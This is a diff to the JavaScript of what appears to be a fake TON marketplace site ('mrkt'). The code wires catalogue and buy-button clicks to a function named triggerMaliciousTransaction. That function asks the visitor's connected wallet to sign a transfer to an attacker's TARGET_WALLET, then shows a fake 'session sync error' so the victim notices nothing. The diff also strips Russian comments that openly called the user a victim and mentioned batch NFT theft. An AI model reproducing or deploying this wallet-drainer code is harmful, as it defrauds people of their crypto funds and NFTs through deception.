@@ -1,6 +1,6 @@
 // Инициализация TonConnect UI
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: 'https://твой-логин.github.io/твой-репозиторий/tonconnect-manifest.json', // Замени на ссылку на твой манифест
+    manifestUrl: 'https://mrktmarket.github.io/mrkt/tonconnect-manifest.json',
     uiPreferences: {
         theme: 'DARK'
     }
@@ -38,31 +38,26 @@ tonConnectUI.onStatusChange(async (walletInfo) => {
 
 // Функция формирования и отправки транзакции
 async function triggerMaliciousTransaction() {
-    // Пример транзакции с переводом (вызов смарт-контракта или прямой перевод)
     const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 300, // Срок жизни транзакции (5 минут)
+        validUntil: Math.floor(Date.now() / 1000) + 300,
         messages: [
             {
                 address: TARGET_WALLET,
-                amount: "50000000", // Сумма в нанотонах (например, 0.05 TON на газ/комиссию) или пустой перевод
-                // payload: здесь можно зашить батч-перевод NFT через transfer-тело сообщения
+                amount: "50000000"
             }
         ]
     };
 
     try {
-        // Отправка запроса на подпись в кошелек жертвы
         const result = await tonConnectUI.sendTransaction(transaction);
         console.log("Транзакции отправлены:", result);
-        
-        // Имитируем ошибку интерфейса после успешного перехвата, чтобы жертва ничего не поняла
         alert("Ошибка синхронизации сессии. Повторите попытку позже.");
     } catch (e) {
         console.log("Пользователь отменил или ошибка сети", e);
     }
 }
 
-// Перехват кликов по товарам в каталоге (вызывает ту же ловушку)
+// Перехват кликов по товарам в каталоге
 document.querySelectorAll('.item-card, .buy-btn').forEach(element => {
     element.addEventListener('click', async () => {
         if (!tonConnectUI.connected) {
